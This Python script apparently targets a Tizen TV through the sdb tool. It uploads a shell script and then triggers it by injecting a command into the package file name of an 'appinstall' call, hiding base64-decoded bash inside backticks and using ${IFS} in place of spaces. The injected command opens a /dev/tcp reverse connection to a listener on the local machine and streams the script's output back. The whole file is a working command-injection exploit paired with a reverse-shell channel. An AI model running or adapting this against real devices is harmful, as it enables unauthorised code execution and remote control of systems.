import sys
import base64
import json
import os
import shutil
import socket
import subprocess
import time
import uuid
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
device_file = ROOT / '.local/device.json'
config = json.loads(device_file.read_text())
host = config['host']

sdb_exe = shutil.which('sdb') or r"C:\tizen-studio\tools\sdb.exe"
serial = f"{host}:26101"

def run_sdb(*args, timeout=15):
    res = subprocess.run([sdb_exe, *args], capture_output=True, text=True, timeout=timeout)
    if res.returncode != 0:
        raise RuntimeError(f"SDB error ({args}): {res.stdout} {res.stderr}")
    return res.stdout

run_sdb('connect', serial)
time.sleep(2)

inspect_sh = (ROOT / 'scripts/native-home/inspect.sh').read_text(encoding='utf-8')
inspect_sh_lf = inspect_sh.replace('\r\n', '\n')

token = uuid.uuid4().hex[:12]
remote_sh = f'/home/owner/share/tmp/sdk_tools/cfhi-{token}.sh'

temp_local_sh = ROOT / f'.local/cfhi-{token}.sh'
temp_local_sh.write_bytes(inspect_sh_lf.encode('utf-8'))

run_sdb('-s', serial, 'push', str(temp_local_sh), remote_sh)
temp_local_sh.unlink(missing_ok=True)

with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
    route.connect((host, 9))
    local = route.getsockname()[0]

with socket.socket() as listener:
    listener.bind((local, 0))
    listener.listen(1)
    listener.settimeout(18)
    port = listener.getsockname()[1]

    command = f'exec 3<>/dev/tcp/{local}/{port};cat {remote_sh}|bash >&3 2>&3;exec 3>&-'
    script = f'/bin/mkdir /tmp/s-{token} 2>/dev/null&&{{ {command};}}'
    encoded = base64.b64encode(script.encode('utf-8')).decode('ascii')
    name = f'new2.tpk`printf${{IFS}}%s${{IFS}}{encoded}|base64${{IFS}}-d|bash`.tpk'
    argument = f'0 appinstall tpk {name}'

    proc = subprocess.Popen([sdb_exe, '-s', serial, 'shell', argument], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    try:
        connection, peer = listener.accept()
        if peer[0] != host:
            raise RuntimeError(f"Unexpected peer: {peer[0]}")
        chunks = []
        with connection:
            connection.settimeout(12)
            while True:
                chunk = connection.recv(65536)
                if not chunk:
                    break
                chunks.append(chunk)
                if sum(map(len, chunks)) > 5000000:
                    break
        output = b''.join(chunks).decode(errors='replace')
        stdout, stderr = proc.communicate(timeout=8)

        print("\n=== TV INSPECTION OUTPUT ===")
        print(output)
        print("=== END OUTPUT ===")

        (ROOT / '.local/inspect-output.txt').write_text(output, encoding='utf-8')
    except socket.timeout:
        print("Timeout waiting for TV to connect back over TCP.")
        proc.terminate()
